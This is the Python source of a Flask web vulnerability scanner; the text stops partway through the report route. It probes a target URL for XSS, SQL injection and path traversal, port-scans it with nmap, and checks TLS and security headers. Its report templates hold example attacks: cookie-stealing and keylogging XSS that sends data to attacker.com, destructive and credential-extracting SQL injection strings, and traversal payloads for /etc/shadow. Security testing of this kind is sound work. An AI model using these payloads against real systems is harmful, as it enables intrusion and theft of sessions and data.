from flask import Flask, render_template, request, jsonify, redirect, url_for
import requests
import concurrent.futures
import socket
import ssl
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import nmap
import sys
import json
import time
import threading
import re
import os
import logging
import subprocess

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("vulnerability_scanner.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("VulnerabilityScanner")

# Import our comprehensive testing module
try:
    from comprehensive_tester import ComprehensiveTester
    COMPREHENSIVE_TESTER_AVAILABLE = True
except ImportError:
    COMPREHENSIVE_TESTER_AVAILABLE = False
    logger.warning("ComprehensiveTester module not available. Falling back to basic scanner.")

# Import our new AI-powered vulnerability scanner
try:
    from ai_vulnerability_scanner import AIVulnerabilityScanner, start_scan as ai_start_scan
    AI_SCANNER_AVAILABLE = True
except ImportError:
    AI_SCANNER_AVAILABLE = False
    logger.warning("AI Vulnerability Scanner not available. Falling back to standard scanner.")

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('FLASK_SECRET_KEY', 'securescannerapp')
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # Limit upload size to 16MB

# Ensure required directories exist
os.makedirs("security_reports", exist_ok=True)
os.makedirs("ai_vulnerability_reports", exist_ok=True)
os.makedirs("static", exist_ok=True)
os.makedirs("static/reports", exist_ok=True)

active_scans = {}
ai_active_scans = {}

class SecurityScanner:
    def __init__(self, target_url, scan_id):
        self.target_url = target_url
        self.scan_id = scan_id
        self.vulnerabilities = []
        self.scan_logs = []
        self.status = "Initializing"
        self.progress = 0
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.system_info = {
            "web_server": "Unknown",
            "technologies": [],
            "frameworks": [],
            "operating_system": "Unknown",
            "ip_address": "Unknown"
        }
        self.exploitation_examples = {}
        self.vulnerable_components = []  # Added new field for vulnerable components
        
    def log_progress(self, message):
        """Log progress and update status"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        self.scan_logs.append(log_entry)
        self.status = message
        logger.info(f"[Scan {self.scan_id}] {message}")
        
    def detect_system_info(self):
        """Detect system architecture and technology stack"""
        self.log_progress("Detecting system architecture and technology stack...")
        try:
            # Get initial response
            response = requests.get(self.target_url, headers=self.headers, timeout=10)
            
            # Check server header
            if 'Server' in response.headers:
                self.system_info["web_server"] = response.headers['Server']
            
            # Get IP address
            hostname = urlparse(self.target_url).netloc
            try:
                self.system_info["ip_address"] = socket.gethostbyname(hostname)
            except:
                pass
                
            # Parse HTML for technology clues
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Detect frameworks
            frameworks = []
            # WordPress detection
            if soup.select('meta[name="generator"][content*="WordPress"]') or soup.select('link[rel="https://api.w.org/"]'):
                frameworks.append("WordPress")
            # Drupal detection
            if soup.select('meta[name="Generator"][content*="Drupal"]') or "Drupal.settings" in response.text:
                frameworks.append("Drupal")
            # Joomla detection
            if soup.select('meta[name="generator"][content*="Joomla"]'):
                frameworks.append("Joomla")
            # Laravel detection
            if "laravel" in response.text.lower() or "csrf-token" in response.text.lower():
                frameworks.append("Laravel")
            # React detection
            if "react" in response.text.lower() or "reactjs" in response.text.lower() or "react-dom" in response.text.lower():
                frameworks.append("React")
            # Angular detection
            if "angular" in response.text.lower() or "ng-app" in response.text.lower():
                frameworks.append("Angular")
            # Vue detection
            if "vue" in response.text.lower() or "vue.js" in response.text.lower():
                frameworks.append("Vue.js")
                
            self.system_info["frameworks"] = frameworks
            
            # Detect technologies
            technologies = []
            # jQuery detection
            if "jquery" in response.text.lower():
                technologies.append("jQuery")
            # Bootstrap detection
            if "bootstrap" in response.text.lower():
                technologies.append("Bootstrap")
            # PHP detection
            if "php" in response.text.lower() or ".php" in response.text.lower():
                technologies.append("PHP")
            # ASP.NET detection
            if "asp.net" in response.text.lower() or ".aspx" in response.text.lower():
                technologies.append("ASP.NET")
            # JSP detection
            if ".jsp" in response.text.lower():
                technologies.append("Java/JSP")
            
            self.system_info["technologies"] = technologies
            
            # Operating system detection based on server header
            server = self.system_info["web_server"].lower()
            if "windows" in server:
                self.system_info["operating_system"] = "Windows"
            elif "ubuntu" in server or "debian" in server:
                self.system_info["operating_system"] = "Linux (Ubuntu/Debian)"
            elif "centos" in server or "rhel" in server or "fedora" in server:
                self.system_info["operating_system"] = "Linux (CentOS/RHEL/Fedora)"
            elif "nginx" in server:
                self.system_info["operating_system"] = "Likely Linux"
            elif "apache" in server:
                self.system_info["operating_system"] = "Unknown (Apache runs on multiple OSes)"
                
        except Exception as e:
            self.log_progress(f"Error detecting system info: {str(e)}")
        
        self.progress += 5
        
    def scan_xss_vulnerabilities(self, url):
        """Сканирование на XSS уязвимости"""
        self.log_progress("Scanning for XSS vulnerabilities...")
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '"><script>alert("XSS")</script>',
        ]
        
        try:
            found_params = []
            for payload in xss_payloads:
                # Проверяем GET параметры
                test_url = f"{url}?test={payload}"
                response = requests.get(test_url, headers=self.headers, timeout=10)
                
                if payload in response.text:
                    self.vulnerabilities.append({
                        "type": "XSS", 
                        "severity": "High", 
                        "details": f"Potential XSS vulnerability found at: {test_url}",
                        "parameter": "test (GET)",
                        "payload": payload,
                        "exploitation_steps": "1. Navigate to the vulnerable URL\n2. Submit payload in the vulnerable parameter\n3. JavaScript executes in victim's browser"
                    })
                    found_params.append("test (GET)")
                
                # Проверяем POST параметры
                response = requests.post(url, data={'test': payload}, headers=self.headers, timeout=10)
                if payload in response.text:
                    self.vulnerabilities.append({
                        "type": "XSS", 
                        "severity": "High", 
                        "details": f"Potential XSS vulnerability found in POST at: {url}",
                        "parameter": "test (POST)",
                        "payload": payload,
                        "exploitation_steps": "1. Submit a form with the payload in the vulnerable parameter\n2. JavaScript executes in victim's browser"
                    })
                    found_params.append("test (POST)")
                    
            # Add exploitation examples
            if found_params:
                self.exploitation_examples["XSS"] = {
                    "description": "Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. This can lead to session theft, credential stealing, or malicious redirects.",
                    "vulnerable_params": found_params,
                    "exploitation_code": """
// Example 1: Cookie stealing XSS payload
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

// Example 2: Keylogger XSS payload
<script>
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/log?key='+e.key)
});
</script>
                    """,
                    "impact": "An attacker could steal user sessions, capture keystrokes, redirect users to phishing sites, or completely take over the user's browsing experience."
                }
                
                # Add vulnerable components
                for param in found_params:
                    self.vulnerable_components.append({
                        "vulnerability_type": "XSS",
                        "component_name": f"{url} ({param})",
                        "affected_components": ["input forms", "search fields", "comment sections", "user profile data"],
                        "severity": "High",
                        "exploit_description": "Attackers can inject and execute malicious JavaScript in users' browsers, allowing session theft, keylogging, and phishing attacks.",
                        "exploit_example": "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
                        "remediation_steps": [
                            "Implement proper input validation",
                            "Use context-aware output encoding",
                            "Implement Content-Security-Policy headers",
                            "Use frameworks with built-in XSS protection"
                        ]
                    })
                    
        except Exception as e:
            self.vulnerabilities.append({"type": "Error", "severity": "Info", "details": f"Error during XSS scan: {str(e)}"})
        self.progress += 14

    def scan_sql_injection(self, url):
        """Сканирование на SQL Injection"""
        self.log_progress("Scanning for SQL Injection vulnerabilities...")
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "1' UNION SELECT null,null,null--",
        ]
        
        try:
            found_params = []
            for payload in sql_payloads:
                test_url = f"{url}?id={payload}"
                response = requests.get(test_url, headers=self.headers, timeout=10)
                
                # Проверяем характерные признаки SQL ошибок
                error_signs = ['SQL syntax', 'mysql_fetch_array', 'ORA-01756']
                for sign in error_signs:
                    if sign in response.text:
                        self.vulnerabilities.append({
                            "type": "SQL Injection", 
                            "severity": "Critical", 
                            "details": f"Potential SQL Injection at: {test_url}",
                            "parameter": "id (GET)",
                            "payload": payload,
                            "exploitation_steps": "1. Navigate to the vulnerable page with the malicious SQL payload\n2. Database executes the injected SQL command"
                        })
                        found_params.append("id (GET)")
                        
            # Add exploitation examples
            if found_params:
                self.exploitation_examples["SQL Injection"] = {
                    "description": "SQL Injection occurs when user input is incorrectly filtered and directly included in SQL queries. This allows attackers to manipulate the database queries executed by the application.",
                    "vulnerable_params": found_params,
                    "exploitation_code": """
# Example 1: Authentication bypass
Username: admin' --
Password: [anything]

# Example 2: Data extraction
id=1 UNION SELECT 1,username,password FROM users--

# Example 3: Database information gathering
id=1 UNION SELECT 1,table_name,column_name FROM information_schema.columns--
                    """,
                    "impact": "An attacker could bypass authentication, extract sensitive data, modify database content, or in worst cases gain complete control over the database server."
                }
                
                # Add vulnerable components
                for param in found_params:
                    self.vulnerable_components.append({
                        "vulnerability_type": "SQL Injection",
                        "component_name": f"{url} ({param})",
                        "affected_components": ["database queries", "login forms", "search functionality", "data filtering"],
                        "severity": "Critical",
                        "exploit_description": "Attackers can inject malicious SQL code that alters the intended database query, allowing unauthorized data access, modification, or deletion.",
                        "exploit_example": "' OR 1=1; --",
                        "remediation_steps": [
                            "Use parameterized queries/prepared statements",
                            "Implement input validation",
                            "Use ORM frameworks",
                            "Apply principle of least privilege for database access"
                        ]
                    })
                        
        except Exception as e:
            self.vulnerabilities.append({"type": "Error", "severity": "Info", "details": f"Error during SQL Injection scan: {str(e)}"})
        self.progress += 14

    def check_ssl_security(self):
        """Проверка SSL/TLS конфигурации"""
        self.log_progress("Checking SSL/TLS security...")
        ssl_issues = []
        try:
            hostname = urlparse(self.target_url).netloc
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Проверка версии протокола
                    if ssock.version() < ssl.TLSVersion.TLSv1_2:
                        self.vulnerabilities.append({
                            "type": "SSL/TLS", 
                            "severity": "Medium", 
                            "details": "Weak SSL/TLS version detected",
                            "specific_issue": "Outdated protocol version",
                            "detected_version": str(ssock.version())
                        })
                        ssl_issues.append("Weak protocol version")
                    
                    # Проверка сертификата
                    if not cert or 'subjectAltName' not in cert:
                        self.vulnerabilities.append({
                            "type": "SSL/TLS", 
                            "severity": "Medium", 
                            "details": "Invalid SSL certificate configuration",
                            "specific_issue": "Missing SubjectAltName extension",
                        })
                        ssl_issues.append("Invalid certificate configuration")
                        
            # Add exploitation examples
            if ssl_issues:
                self.exploitation_examples["SSL/TLS"] = {
                    "description": "SSL/TLS weaknesses can allow attackers to decrypt traffic, steal sensitive information, or perform man-in-the-middle attacks.",
                    "detected_issues": ssl_issues,
                    "exploitation_scenario": """
A malicious actor on the same network could potentially:
1. Use tools like sslstrip to downgrade connections from HTTPS to HTTP
2. Capture sensitive information like passwords and session tokens
3. With old TLS versions, exploit vulnerabilities like POODLE or BEAST to decrypt traffic
                    """,
                    "impact": "Attackers could intercept and read encrypted traffic, steal credentials, or impersonate the website to users."
                }
                        
        except Exception as e:
            self.vulnerabilities.append({"type": "SSL/TLS", "severity": "Info", "details": f"SSL/TLS Error: {str(e)}"})
        self.progress += 14

    def scan_open_ports(self):
        """Сканирование открытых портов"""
        self.log_progress("Scanning for open ports...")
        try:
            nm = nmap.PortScanner()
            hostname = urlparse(self.target_url).netloc
            nm.scan(hostname, arguments='-sS -p 1-1000')
            
            open_ports = []
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    ports = nm[host][proto].keys()
                    for port in ports:
                        state = nm[host][proto][port]['state']
                        service = nm[host][proto][port].get('name', 'unknown')
                        if state == 'open':
                            port_info = {
                                "port": port,
                                "protocol": proto,
                                "service": service
                            }
                            open_ports.append(port_info)
                            self.vulnerabilities.append({
                                "type": "Open Port", 
                                "severity": "Low", 
                                "details": f"Open port {port} ({proto}) found - Service: {service}",
                                "port_info": port_info
                            })
                            
            # Add exploitation examples if open ports found
            if open_ports:
                dangerous_ports = [p for p in open_ports if p["port"] in [21, 22, 23, 25, 53, 3306, 3389, 5432, 8080, 8443]]
                self.exploitation_examples["Open Port"] = {
                    "description": "Open ports can provide attackers with potential entry points into your system. Each service running on an open port may have its own vulnerabilities.",
                    "detected_ports": open_ports,
                    "exploitation_scenario": """
An attacker might:
1. Scan for open ports to create a map of your infrastructure
2. Probe for version information and known vulnerabilities in running services
3. Attempt brute-force attacks against services like SSH, FTP, or admin panels
4. Exploit specific vulnerabilities in the services running on these ports
                    """,
                    "dangerous_ports": dangerous_ports if dangerous_ports else [],
                    "impact": "Depending on the service, attackers could gain unauthorized access, extract sensitive data, or use your system as a jumping point to attack internal systems."
                }
                            
        except Exception as e:
            self.vulnerabilities.append({"type": "Error", "severity": "Info", "details": f"Port scanning error: {str(e)}"})
        self.progress += 14

    def check_directory_traversal(self):
        """Проверка уязвимости обхода директорий"""
        self.log_progress("Checking for directory traversal vulnerabilities...")
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
        ]
        
        try:
            found_vulnerabilities = []
            for payload in traversal_payloads:
                test_url = urljoin(self.target_url, payload)
                response = requests.get(test_url, headers=self.headers, timeout=10)
                
                if response.status_code == 200:
                    if "root:" in response.text or "[extensions]" in response.text:
                        found_vulnerabilities.append({
                            "payload": payload,
                            "url": test_url,
                            "response_preview": response.text[:100] + "..." if len(response.text) > 100 else response.text
                        })
                        
                        self.vulnerabilities.append({
                            "type": "Directory Traversal", 
                            "severity": "High", 
                            "details": f"Potential Directory Traversal at: {test_url}",
                            "payload": payload,
                            "response_preview": response.text[:100] + "..." if len(response.text) > 100 else response.text
                        })
                        
            # Add exploitation examples
            if found_vulnerabilities:
                self.exploitation_examples["Directory Traversal"] = {
                    "description": "Directory traversal (path traversal) vulnerabilities allow attackers to access files and directories outside the web root folder by manipulating variables that reference files with dot-dot-slash (../) sequences.",
                    "detected_vulnerabilities": found_vulnerabilities,
                    "exploitation_code": """
# Common path traversal payloads:
../../../etc/passwd
../../../etc/shadow
../../../var/www/html/config.php
..\\..\\..\\windows\\win.ini
..\\..\\..\\Windows\\system.ini
../../../boot.ini
                    """,
                    "impact": "Attackers can read sensitive files such as application configuration files containing database credentials, system files revealing user accounts, or even access files outside the web server's intended directory structure."
                }
                        
        except Exception as e:
            self.vulnerabilities.append({"type": "Error", "severity": "Info", "details": f"Directory Traversal scan error: {str(e)}"})
        self.progress += 14

    def check_security_headers(self):
        """Проверка заголовков безопасности"""
        self.log_progress("Checking security headers...")
        try:
            response = requests.get(self.target_url, headers=self.headers, timeout=10)
            headers = response.headers
            
            security_headers = {
                'X-Frame-Options': {
                    'severity': 'Medium', 
                    'message': 'Missing X-Frame-Options header (clickjacking protection)',
                    'description': 'Helps prevent clickjacking attacks by ensuring your site cannot be embedded in frames on other domains',
                    'example': 'X-Frame-Options: DENY',
                    'impact': 'Without this header, attackers could embed your website in an invisible iframe and trick users into clicking on elements'
                },
                'X-XSS-Protection': {
                    'severity': 'Low', 
                    'message': 'Missing X-XSS-Protection header',
                    'description': 'Enables the browser\'s built-in XSS filter to block reflected XSS attacks',
                    'example': 'X-XSS-Protection: 1; mode=block',
                    'impact': 'Missing this header may leave users more vulnerable to certain types of XSS attacks in older browsers'
                },
                'X-Content-Type-Options': {
                    'severity': 'Low', 
                    'message': 'Missing X-Content-Type-Options header',
                    'description': 'Prevents MIME type sniffing which can be used to perform XSS attacks',
                    'example': 'X-Content-Type-Options: nosniff',
                    'impact': 'Without this header, browsers might interpret files as a different MIME type, enabling certain attack vectors'
                },
                'Strict-Transport-Security': {
                    'severity': 'Medium', 
                    'message': 'Missing HSTS header',
                    'description': 'Forces browsers to use HTTPS for future visits to the site, preventing SSL stripping attacks',
                    'example': 'Strict-Transport-Security: max-age=31536000; includeSubDomains',
                    'impact': 'Without HSTS, users may be vulnerable to downgrade attacks that force connections back to unencrypted HTTP'
                },
                'Content-Security-Policy': {
                    'severity': 'Medium', 
                    'message': 'Missing Content Security Policy header',
                    'description': 'Restricts the sources from which content can be loaded, preventing XSS and data injection attacks',
                    'example': "Content-Security-Policy: default-src 'self'",
                    'impact': 'Without CSP, any injected scripts can load resources from any domain, making XSS attacks more powerful'
                }
            }
            
            missing_headers = []
            for header, details in security_headers.items():
                if header not in headers:
                    missing_headers.append(header)
                    self.vulnerabilities.append({
                        "type": "Security Headers", 
                        "severity": details['severity'], 
                        "details": details['message'],
                        "header_info": {
                            "header_name": header,
                            "description": details['description'],
                            "example": details['example'],
                            "impact": details['impact']
                        }
                    })
                    
            # Add exploitation examples
            if missing_headers:
                self.exploitation_examples["Security Headers"] = {
                    "description": "Missing security headers can make a website more vulnerable to various attacks including XSS, clickjacking, and MIME sniffing attacks.",
                    "missing_headers": missing_headers,
                    "exploitation_scenario": """
For example, without X-Frame-Options:
1. An attacker creates a website with an invisible iframe containing your site
2. The attacker overlays their own content to trick users into clicking certain elements
3. Users think they're interacting with the attacker's site but are actually clicking buttons on your site

Without Content-Security-Policy:
1. If an XSS vulnerability exists, attackers can load scripts from any domain
2. This allows exfiltration of sensitive data to attacker-controlled servers
                    """,
                    "impact": "Missing security headers can make other vulnerabilities more severe and easier to exploit."
                }
                    
        except Exception as e:
            self.vulnerabilities.append({"type": "Error", "severity": "Info", "details": f"Security headers check error: {str(e)}"})
        self.progress += 20

    def run_comprehensive_test(self):
        """Run comprehensive testing using our new module"""
        self.log_progress("Starting comprehensive security testing...")
        
        try:
            # Create a ComprehensiveTester instance
            tester = ComprehensiveTester(self.target_url, "comprehensive_reports", self.scan_id)
            
            # Run passive reconnaissance
            passive_results = tester.run_passive_reconnaissance()
            self.log_progress("Passive reconnaissance completed")
            self.progress += 15
            
            # Run active reconnaissance
            active_results = tester.run_active_reconnaissance()
            self.log_progress("Active reconnaissance completed")
            self.progress += 15
            
            # Analyze infrastructure
            infrastructure_results = tester.analyze_infrastructure()
            self.log_progress("Infrastructure analysis completed")
            self.progress += 15
            
            # Analyze tech stack
            tech_stack_results = tester.analyze_tech_stack()
            self.log_progress("Technology stack analysis completed")
            self.progress += 15
            
            # Integrate findings into our results
            if "error" not in passive_results:
                # Add passive recon findings to vulnerabilities
                whois_data = passive_results.get("whois", {})
                if whois_data and not isinstance(whois_data, dict):
                    self.vulnerabilities.append({
                        "type": "Information Disclosure", 
                        "severity": "Low", 
                        "details": "WHOIS data publicly available",
                        "exposed_info": "Domain registration information"
                    })
                
                # Add DNS info
                dns_results = passive_results.get("dns", {})
                if dns_results and "error" not in dns_results:
                    self.vulnerabilities.append({
                        "type": "Reconnaissance", 
                        "severity": "Info", 
                        "details": "DNS records provide information about the infrastructure",
                        "records": dns_results
                    })
            
            if "error" not in active_results:
                # Add open ports from active recon
                port_results = active_results.get("port_scan", [])
                for port_info in port_results:
                    if isinstance(port_info, dict) and port_info.get("state") == "open":
                        self.vulnerabilities.append({
                            "type": "Open Port", 
                            "severity": "Low", 
                            "details": f"Open port {port_info.get('port')} found - Service: {port_info.get('service')}",
                            "port_info": port_info
                        })
            
            if "error" not in infrastructure_results:
                # Check for WAF as a security measure
                waf_info = infrastructure_results.get("waf", {})
                if isinstance(waf_info, dict) and not waf_info.get("detected", False):
                    self.vulnerabilities.append({
                        "type": "Missing Protection", 
                        "severity": "Medium", 
                        "details": "No Web Application Firewall (WAF) detected",
                        "recommendation": "Consider implementing a WAF to protect against common web attacks"
                    })
                
                # Check DNS security configurations
                dns_config = infrastructure_results.get("dns_configuration", {})
                if isinstance(dns_config, dict):
                    if not dns_config.get("spf_record", False):
                        self.vulnerabilities.append({
                            "type": "Email Security", 
                            "severity": "Medium", 
                            "details": "Missing SPF record",
                            "impact": "Domain may be vulnerable to email spoofing attacks"
                        })
                    
                    if not dns_config.get("dmarc_record", False):
                        self.vulnerabilities.append({
                            "type": "Email Security", 
                            "severity": "Medium", 
                            "details": "Missing DMARC record",
                            "impact": "Reduced protection against email spoofing and phishing"
                        })
            
            if "error" not in tech_stack_results:
                # Check for outdated software versions
                versions = tech_stack_results.get("versions", {})
                if isinstance(versions, dict):
                    for software, version in versions.items():
                        if software != "other_cms" and version:
                            self.vulnerabilities.append({
                                "type": "Version Disclosure", 
                                "severity": "Low", 
                                "details": f"Software version disclosure: {software} {version}",
                                "impact": "Version information may help attackers identify known vulnerabilities"
                            })
                
                # Record libraries for information purposes
                libraries = tech_stack_results.get("libraries", {})
                if isinstance(libraries, dict):
                    js_libs = libraries.get("javascript", [])
                    for lib in js_libs:
                        self.system_info["technologies"].append(lib.get("name", "Unknown JS Library"))
                    
                    css_libs = libraries.get("css", [])
                    for lib in css_libs:
                        self.system_info["technologies"].append(lib.get("name", "Unknown CSS Library"))
            
            # Save comprehensive test results
            tester.save_results()
            self.log_progress("Comprehensive testing completed")
            self.progress = 95
            
        except Exception as e:
            self.log_progress(f"Error during comprehensive testing: {str(e)}")
            self.vulnerabilities.append({
                "type": "Error", 
                "severity": "Info", 
                "details": f"Comprehensive testing error: {str(e)}"
            })
        
        self.progress = 100

    def identify_vulnerable_components(self):
        """Identify vulnerable components and describe their exploitation methods"""
        self.log_progress("Identifying vulnerable components and describing their exploitation...")
        
        # If we haven't already populated vulnerable_components in the specific scan methods,
        # we can derive them here from the vulnerabilities list
        if not self.vulnerable_components:
            for vulnerability in self.vulnerabilities:
                vuln_type = vulnerability.get("type", "")
                
                # Skip non-security or error entries
                if vuln_type in ["Error", "Info"]:
                    continue
                
                # Get details about the affected endpoint or component
                affected_endpoint = vulnerability.get("affected_endpoints", {})
                affected_param = affected_endpoint.get("parameter", affected_endpoint.get("form_action", "Unknown"))
                affected_url = affected_endpoint.get("url", "Unknown")
                
                # Create vulnerable component entry based on vulnerability type
                component_info = {
                    "vulnerability_type": vuln_type,
                    "component_name": f"{affected_url} ({affected_param})",
                    "severity": vulnerability.get("severity", "Medium"),
                    "remediation_steps": []
                }
                
                # Add type-specific information
                if vuln_type == "XSS":
                    component_info.update({
                        "affected_components": ["input forms", "search fields", "comment sections", "user profile data"],
                        "exploit_description": "Attackers can inject and execute malicious JavaScript in users' browsers, allowing session theft, keylogging, and phishing attacks.",
                        "exploit_example": "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
                        "remediation_steps": [
                            "Implement proper input validation",
                            "Use context-aware output encoding",
                            "Implement Content-Security-Policy headers",
                            "Use frameworks with built-in XSS protection"
                        ]
                    })
                elif vuln_type == "SQL Injection":
                    component_info.update({
                        "affected_components": ["database queries", "login forms", "search functionality", "data filtering"],
                        "exploit_description": "Attackers can inject malicious SQL code that alters the intended database query, allowing unauthorized data access, modification, or deletion.",
                        "exploit_example": "' OR 1=1; --",
                        "remediation_steps": [
                            "Use parameterized queries/prepared statements",
                            "Implement input validation",
                            "Use ORM frameworks",
                            "Apply principle of least privilege for database access"
                        ]
                    })
                elif vuln_type == "Open Port":
                    port_info = vulnerability.get("port_info", {})
                    port = port_info.get("port", "Unknown")
                    service = port_info.get("service", "Unknown")
                    component_info.update({
                        "affected_components": ["network services", "exposed ports", "public interfaces"],
                        "exploit_description": f"The {service} service on port {port} is publicly accessible and may be vulnerable to unauthorized access or exploitation.",
                        "exploit_example": f"nmap -sV -p {port} {self.target_url}",
                        "remediation_steps": [
                            "Implement firewalls and restrict access to necessary ports only",
                            "Use VPNs or private networks for sensitive services",
                            "Keep services updated to avoid known vulnerabilities",
                            "Implement strong authentication for exposed services"
                        ]
                    })
                else:
                    # Generic for other vulnerability types
                    component_info.update({
                        "affected_components": ["web application components"],
                        "exploit_description": f"The {vuln_type} vulnerability may allow attackers to compromise the security of the application.",
                        "exploit_example": "Varies based on the specific vulnerability",
                        "remediation_steps": [
                            "Keep all software and dependencies updated",
                            "Implement security best practices",
                            "Perform regular security testing",
                            "Follow secure coding guidelines"
                        ]
                    })
                
                self.vulnerable_components.append(component_info)
        
        self.log_progress(f"Identified {len(self.vulnerable_components)} vulnerable components")
        return self.vulnerable_components

    def restart_server_after_update(self):
        """Restart the server after updating vulnerability data"""
        self.log_progress("Preparing to restart server after vulnerability data update")
        
        try:
            # Create a restart flag file that will be checked by the server
            restart_flag_path = os.path.join("security_reports", "restart_required.flag")
            with open(restart_flag_path, "w") as f:
                f.write(f"Restart triggered after scan {self.scan_id} at {time.strftime('%Y-%m-%d %H:%M:%S')}")
            
            self.log_progress("Server restart flag created. Server will restart at next check.")
                
        except Exception as e:
            self.log_progress(f"Error creating restart flag: {str(e)}")
            logger.error(f"Error creating restart flag: {str(e)}")
            
        self.progress += 1

    def run_scan(self):
        """Запуск сканирования"""
        self.log_progress(f"Starting security scan for {self.target_url}")
        
        # URL validation
        if not re.match(r'^https?://', self.target_url):
            self.target_url = 'http://' + self.target_url
        
        try:
            # Initial check - can we reach the site?
            requests.get(self.target_url, headers=self.headers, timeout=10)
            
            # System architecture detection
            self.detect_system_info()
            
            # Run comprehensive tests if available
            if COMPREHENSIVE_TESTER_AVAILABLE:
                self.run_comprehensive_test()
            else:
                # Run scans sequentially to avoid overwhelming the site
                self.scan_xss_vulnerabilities(self.target_url)
                self.scan_sql_injection(self.target_url)
                self.check_ssl_security()
                self.scan_open_ports()
                self.check_directory_traversal()
                self.check_security_headers()
            
            # Identify vulnerable components if not already done
            self.identify_vulnerable_components()
            
            # Prepare server restart after updating data
            self.restart_server_after_update()
            
            self.log_progress("Scan completed")
            self.status = "Completed"
            self.progress = 100
            
        except requests.ConnectionError:
            error_msg = f"Could not connect to {self.target_url}. Please check if the URL is correct and the site is online."
            self.log_progress(error_msg)
            self.status = "Failed"
            self.vulnerabilities.append({"type": "Error", "severity": "Info", "details": error_msg})
            self.progress = 100
        except requests.Timeout:
            error_msg = f"Connection to {self.target_url} timed out. The site might be slow or unreachable."
            self.log_progress(error_msg)
            self.status = "Failed"
            self.vulnerabilities.append({"type": "Error", "severity": "Info", "details": error_msg})
            self.progress = 100
        except Exception as e:
            error_msg = f"Scan failed: {str(e)}"
            self.log_progress(error_msg)
            self.status = "Failed"
            self.vulnerabilities.append({"type": "Error", "severity": "Info", "details": error_msg})
            logger.exception(f"Error during scan of {self.target_url}")
            self.progress = 100

def start_scan(url):
    """Start a new scan and return the scan ID"""
    try:
        scan_id = str(int(time.time()))
        scanner = SecurityScanner(url, scan_id)
        active_scans[scan_id] = scanner
        
        # Start scan in a separate thread
        threading.Thread(target=scanner.run_scan).start()
        
        return scan_id
    except Exception as e:
        logger.exception(f"Error starting scan for {url}: {str(e)}")
        raise

@app.route('/')
def index():
    try:
        return render_template('index.html', ai_scanner_available=AI_SCANNER_AVAILABLE)
    except Exception as e:
        logger.exception(f"Error rendering index page: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/scan', methods=['POST'])
def scan():
    try:
        url = request.form.get('url')
        consent = request.form.get('consent')
        scan_type = request.form.get('scan_type', 'standard')
        
        if not url:
            return jsonify({'error': 'URL is required'}), 400
        
        if not consent:
            return jsonify({'error': 'Please confirm that you have legal permission to scan this website before proceeding'}), 400
        
        if scan_type == 'ai' and AI_SCANNER_AVAILABLE:
            # Use the AI-powered scanner
            scanner = ai_start_scan(url, "ai_vulnerability_reports")
            scan_id = scanner.scan_id
            ai_active_scans[scan_id] = scanner
            return jsonify({'scan_id': scan_id, 'scan_type': 'ai'})
        else:
            # Use the standard scanner
            scan_id = start_scan(url)
            return jsonify({'scan_id': scan_id, 'scan_type': 'standard'})
    except Exception as e:
        logger.exception(f"Error starting scan: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/scan/<scan_id>/status')
def scan_status(scan_id):
    try:
        # Check if it's an AI scan or standard scan
        if scan_id in ai_active_scans:
            scanner = ai_active_scans[scan_id]
            return jsonify({
                'status': scanner.status,
                'progress': scanner.progress,
                'logs': scanner.scan_logs,
                'scan_type': 'ai',
                'vulnerabilities': scanner.results.get('vulnerabilities', [])
            })
        elif scan_id in active_scans:
            scanner = active_scans[scan_id]
            return jsonify({
                'status': scanner.status,
                'progress': scanner.progress,
                'logs': scanner.scan_logs,
                'scan_type': 'standard',
                'vulnerabilities': scanner.vulnerabilities
            })
        else:
            return jsonify({'error': 'Scan not found'}), 404
    except Exception as e:
        logger.exception(f"Error getting scan status for {scan_id}: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/scan/<scan_id>/report')
def scan_report(scan_id):
    try:
        # Check if it's an AI scan or standard scan
        if scan_id in ai_active_scans:
            scanner = ai_active_scans[scan_id]
            
            # For AI scanner, we need to adapt the data for our templates
            return render_template('report.html', 
                            scan_id=scan_id,
                            target_url=scanner.target_url,
                            scan_type='ai',
                            vulnerabilities=scanner.results.get('vulnerabilities', []),
                            system_info=scanner.results.get('system_info', {}),
                            exploitation_examples=scanner.results.get('exploitation_paths', {}),
                            ai_analysis=scanner.results.get('ai_analysis', {}),
                            remediation=scanner.results.get('remediation', {}),
                            vulnerable_components=scanner.results.get('vulnerable_components', []),
                            logs=scanner.scan_logs,
                            status=scanner.status)
        elif scan_id in active_scans:
            scanner = active_scans[scan_id]
            
            # Generate a detailed report using the new vulnerability reporter
            try:
                # First, check if we have the new reporting module available
                from vulnerability_reporter import generate_vulnerability_report
                has_detailed_reporting = True
            except ImportError:
                has_detailed_reporting = False
                logger.warning("Vulnerability reporter module not available. Using basic report template.")
            
            # Use the detailed reporter if available
            if has_detailed_reporting:
                # Create a report directory for this scan
                report_dir = os.path.join("security_reports", f"scan_{scan_id}")
                os.makedirs(report_dir, exist_ok=True)
                
                # Prepare data for the detailed report
                report_data = {
                    "target": scanner.target_url,
                    "timestamp": scan_id,
